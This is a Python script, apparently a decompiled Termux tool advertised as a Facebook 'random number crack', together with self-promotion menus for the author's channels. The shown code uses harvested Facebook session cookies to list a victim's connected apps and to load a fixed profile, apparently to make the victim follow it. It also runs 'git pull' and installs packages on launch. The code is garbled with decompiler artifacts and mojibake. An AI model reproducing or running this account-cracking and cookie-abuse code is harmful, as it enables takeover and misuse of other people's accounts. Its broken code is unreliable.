#R1F4T 
#My_Project

import os
import sys
import time
import requests
import uuid
os.system('git pull')
os.system('pkg install curl')

logo = (""""\033[132m🅁①🄵④🅃
\033[1;32m╔══════════════════════════════════╗╔════════════════════════╗
\033[1;32m║NOTE : \033[37;45mTHIS TOOLS IS FREE V4\033[0;m\033[1;32m     ║║ \x1b[1;93m╭━━━╮╭╮╭━━━┳╮╱╭┳━━━━╮\033[1;32m   ║
\033[1;32m║══════════════════════════════════║║ \x1b[1;93m ┃╭━╮┣╯┃┃╭━━┫┃╱┃┃╭╮╭╮┃\033[1;32m ║
\033[1;32m║AUTHOR    : Mahi Chowdhury  ║║ \x1b[1;91m┃╰━╯┣╮┃┃╰━━┫╰━╯┣╯┃┃╰╯\033[1;32m  ║
\033[1;32m║══════════════════════════════════║║  \x1b[1;93m┃╭╮╭╯┃┃┃╭━━┻━━╮┃╱┃┃\033[1;32m   ║
\033[1;32m║WHATSAPP  : +8801735787710       ║║  \x1b[1;91m┃┃┃╰┳╯╰┫┃╱╱╱╱╱┃┃╱┃┃\033[1;32m    ║
\033[1;32m║══════════════════════════════════║║  \x1b[1;93m╰╯╰━┻━━┻╯╱╱╱╱╱╰╯╱╰╯\033[1;32m   ║
\033[1;32m║GITHUB    : ex-spamer            ║║                         ║
\033[1;32m║══════════════════════════════════║║\x1b[1;93m       ᴠᴇʀꜱɪᴏɴ:4.0 \033[1;32m     ║
\033[1;32m║SERVER    : DATA - WIFI WORKING  ║╚═════════════════════════╝
\033[1;32m║══════════════════════════════════════════════════════════╗
\033[1;32m║FACEBOOK : Mahi Chowdhury  ║ Mahi 
\033[1;32m║══════════════════════════════════════════════════════════║
\033[1;32m║FB PAGE :  It's Mahi            ║ Mahi
\033[1;32m╚══════════════════════════════════════════════════════════╝\033[1;37m\n""")
def ud():
    os.system('clear')
    jalan(logo)
    print(' \033[1;32m[1] SUBSCRIBE MY CHANNEL')
    print(' [2] EXIT')
    opt = input('\n   CHOOSE OPTION >>>\033[1;37m ')
    if opt == '1':
        os.system('xdg-open https://youtube.com/channel/UCqmAeJg_2YaF9q_zFIxwSlQ')
        FD()
        return None
    None('\n\x1b[1;31mEXIT\x1b[0;97m')


def FD():
    os.system('clear')
    print(logo)
    print('\x1b[1;33m [1] FOLLOW THIS MY FACEBOOK PAGE')
    print(' [2] EXIT')
    opt = input('\n  \x1b[1;32m CHOOSE OPTION >>> ')
    if opt == '1':
        os.system('xdg-open https://www.facebook.com/profile.php?id=100075160338795')
        o()
        return None
    None('\n\x1b[1;31mEXIT\x1b[0;97m')


def o():
    os.system('clear')
    jalan(logo)
    jalan('\33[37;41m\t RANDOM NUMBER CRACK\33[0;m')
    print('')
    jalan('\x1b[1;32m [1]\x1b[1;33m RANDOM CRACK ')
    jalan('\x1b[1;32m [2] \x1b[1;32mCONTACT ME ON FACEBOOK')
    jalan(' \x1b[1;32m[3] \x1b[1;32mSUBSCRIBE MY CHANNEL')
    jalan(' \x1b[1;32m[4] \x1b[1;32mFOLLOW FACEBOOK PAGE')
    jalan(' \x1b[1;32m[00] \x1b[1;31mEXIT')
    opt = input('\n   \x1b[1;32m CHOOSE OPTION >>> ')
    if opt == '1':
        i()
    if opt == '2':
        os.system('xdg-open https://www.facebook.com/Ummmmaaaaaahh')
        return None
    if opt == '3':
        os.system('xdg-open https://youtube.com/channel/UCqmAeJg_2YaF9q_zFIxwSlQ')
        return None
    if opt == '4':
        os.system('xdg-open https://www.facebook.com/profile.php?id=100075160338795')
        
import os,sys,time,json,random,re,string,platform,base64,uuid
os.system("git pull")
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from time import sleep as waktu
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')

def cek_apk(session,coki):
    w=session.get("https://free.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r%s[%s!%s] %sSorry there is no Active  Apk%s  '%(N,M,N,M,N))
    else:
        print(f'\r[ðŸŽ®] %s \x1b[1;95m â˜† Your Active Apps â˜†     :{WHITE}'%(GREEN))
        for i in range(len(game)):
            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
        #else:
            #print(f'\r %s[%s!%s] Sorry, Apk check failed invalid cookie'%(N,M,N))
    w=session.get("https://free.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r%s[%s!%s] %sSorry there is no Expired Apk%s           \n'%(N,M,N,M,N))
    else:
        print(f'\r[ðŸŽ®] %s \x1b[1;95m â—‡ Your Expired Apps â—‡    :{WHITE}'%(M))
        for i in range(len(game)):
            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))
        else:
            print('')

def follow(self, session, coki):
        r = BeautifulSoup(session.get('https://free.facebook.com/profile.php?id=100015315258519', {
            'cookie': coki }, **('cookies',)).text, 'html.parser')
